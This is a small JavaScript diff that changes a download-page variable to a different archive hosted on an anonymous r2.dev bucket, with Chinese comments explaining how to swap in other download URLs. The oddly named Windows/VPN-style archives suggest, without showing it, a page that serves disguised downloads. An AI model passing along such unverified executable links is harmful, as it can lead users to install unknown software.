@@ -1,4 +1,4 @@
-var xz ="download.html?file=https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/lsstvp_step-32.rar";
+var xz ="download.html?file=https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/Axs_win7-11_xLertsvrpn_m8627.53%20(2).zip";
 
 //可以把   https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/lssvpp3232.zip  这个改成下载地址；https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/lssvpp3232.zip
 //可以把   https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/lssvpp3232.zip  这个改成文件下载：https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/lssvpp3232.zip
